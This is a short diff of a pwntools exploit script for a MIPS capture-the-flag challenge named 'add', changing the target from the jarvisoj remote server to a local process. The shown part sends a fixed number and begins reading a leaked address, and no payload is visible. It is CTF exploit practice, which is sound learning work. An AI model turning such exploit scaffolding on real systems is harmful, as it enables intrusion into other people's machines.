@@ -3,12 +3,14 @@
 __Auther__ = 'M4x'
 
 from pwn import *
+from pwnlib import qemu
 context.arch = "mips"
 context.endian = "little"
 context.log_level = "debug"
 context.bits = 32
 
-io = remote("pwn2.jarvisoj.com", 9889)
+io = process("./add")
+#  io = remote("pwn2.jarvisoj.com", 9889)
 
 io.sendlineafter("help.\n", '2057561479')
 io.recvuntil("0x")
